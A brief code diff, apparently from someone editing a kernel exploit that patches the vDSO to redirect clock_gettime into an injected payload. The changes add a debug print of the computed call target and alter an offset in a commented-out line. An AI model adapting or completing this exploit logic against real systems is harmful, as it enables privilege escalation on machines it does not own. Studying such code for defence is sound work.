@@ -268,6 +268,7 @@ static int build_vdso_patch(void *vdso_addr, struct prologue *prologue)
 
 	/* craft call to payload */
 	target = VDSO_SIZE - payload_len - clock_gettime_offset;
+  printf("target address is %d\n", target - 5);
 	memset(buf, '\x90', sizeof(PATTERN_PROLOGUE)-1);
 	buf[0] = '\xe8';
   // TODO: here ill need to make sure this points to the correct place (which is start of payload?)
@@ -677,7 +678,7 @@ static struct prologue *fingerprint_prologue(void *vdso_addr)
   void *entry_point;
 
 	/* e_entry */
-  //entry_point = *(uint64_t *)((unsigned char *)vdso_addr + 0x18);
+  //entry_point = *(uint64_t *)((unsigned char *)vdso_addr + 0x14);
 	//clock_gettime_offset = (uint32_t)entry_point & 0xfff;
 	//clock_gettime_addr = (unsigned long)vdso_addr + clock_gettime_offset;
 
